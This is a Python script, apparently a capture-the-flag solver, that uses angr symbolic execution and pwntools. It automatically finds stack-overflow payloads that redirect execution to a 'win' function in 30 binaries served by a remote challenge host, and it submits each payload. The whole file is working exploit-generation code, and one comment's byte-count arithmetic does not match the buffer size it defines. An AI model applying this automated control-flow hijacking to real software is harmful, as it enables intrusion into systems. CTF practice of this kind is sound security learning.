import angr
import pwn
import base64
import os
import time
import claripy

def solve_payload(binary_path):
    # Load the binary into the angr project. 
    # auto_load_libs=False speeds up loading by ignoring shared libraries.
    # 将二进制文件加载到 angr 工程中。
    # auto_load_libs=False 可以忽略共享库，显著加快加载速度。
    project = angr.Project(binary_path, auto_load_libs=False)
    
    # Dynamically find the address of the 'win' function from the symbol table.
    # 从符号表中动态获取 'win' 函数的地址。
    win_sym = project.loader.find_symbol('win')
    if not win_sym:
        return None
    target_addr = win_sym.rebased_addr

    #define bit vector for payload
    #26 byte for stack buffer + 8 to overwrite bsp + 8 for return address
    flag = claripy.BVS('my_payload', 32 * 8) 
    # get entry state of elf
    state = project.factory.entry_state(stdin=flag)

    #save_unconstrained=True is a configuration flag for angr's Simulation
    #Manager. It instructs the engine to capture states where the Instruction Pointer (RIP/EIP)
    #becomes symbolic (meaning it can point anywhere) instead of discarding them as crash
    simgr = project.factory.simulation_manager(state, save_unconstrained=True)
    
    # Step through the program until an overflow allows control of the program counter.
    # 步进执行程序，直到发现输入溢出并控制了程序计数器。
    while not simgr.unconstrained:
        simgr.step()
        if not simgr.active:
            break
           
    if simgr.unconstrained:
        # Take the first state where the return address is overwritten by symbolic input.
        # 获取第一个返回地址被符号化输入覆盖（即我们可以控制跳转）的状态。
        control_state = simgr.unconstrained[0]
        
        # Add constraint: Force the Instruction Pointer to point to the 'win' function.
        # 添加约束：强制指令指针 RIP 指向我们的目标 'win' 函数地址。
        control_state.add_constraints(control_state.regs.rip == target_addr)
        
        # Solve for the required stdin input to satisfy the constraints.
        # 求解能满足上述约束（即导致成功跳转到 win）的原始输入字符串。
        if control_state.satisfiable():
            # ep.posix.dumps(0) extracts the content of stdin (file descriptor 0).
            # 获取标准输入（文件描述符 0）的内容，这是最稳妥的提取解的方式。
            return control_state.posix.dumps(0)
    return None

# --- Remote 30-Round Automation Framework ---
# --- 远程 30 轮自动化框架 ---
def run_challenge():
    host = "svtctf.m0lecon.it"
    port = 13466
    
    pwn.log.info("Establishing connection... / 正在建立连接...")
    io = pwn.remote(host, port)
    
    tmp_bin = "./temp_binary"

    try:
        # The server sends 30 different binaries; we solve them in a loop.
        # 服务器会连续发送 30 个不同的二进制文件，我们需要循环解题。
        for i in range(1, 31):
            pwn.log.info(f"========== Level {i}/30 / 第 {i}/30 关 ==========")
            
            # 1. Receive the Base64 encoded binary from the server.
            # 1. 接收服务器发送的 Base64 编码的二进制数据。
            io.recvuntil(b"-----BEGIN BINARY-----")
            b64_data = io.recvuntil(b"-----END BINARY-----", drop=True)
            
            # 2. Decode and save to a local file with execution permissions.
            # 2. 解码并保存为本地文件，同时赋予执行权限。
            with open(tmp_bin, "wb") as f:
                f.write(base64.b64decode(b64_data))
            os.chmod(tmp_bin, 0o755)
            
            # 3. Solve for the overflow payload using symbolic execution.
            # 3. 使用符号执行计算溢出 Payload。
            start_solve = time.time()
            payload = solve_payload(tmp_bin)
            solve_time = time.time() - start_solve
            
            if payload:
                pwn.log.success(f"Solution found! Time: {solve_time:.2f}s / 找到解！耗时: {solve_time:.2f}s")
                # 4. Wait for the prompt and send the payload.
                # 4. 等待服务器提示并发送 Payload。
                io.recvuntil(b"Send me some data:")
                io.sendline(payload)
                
                # Print server feedback (e.g., "Good job!").
                # 打印服务器的反馈（例如：“做得好！”）。
                pwn.log.info(f"Server: {io.recvline().strip().decode()}")
            else:
                pwn.log.error("Failed to solve level! / 无法解出这一关！")
                break
                
        # Switch to interactive mode once all levels are cleared.
        # 全部完成后进入交互模式，通常此处会打印出 Flag。
        pwn.log.success("All levels cleared! / 30 关全部通过！")
        io.interactive()

    except Exception as e:
        pwn.log.error(f"Error: {e} / 运行异常: {e}")
    finally:
        # Clean up the temporary binary.
        # 清理生成的临时二进制文件。
        if os.path.exists(tmp_bin):
            os.remove(tmp_bin)

if __name__ == "__main__":
    run_challenge()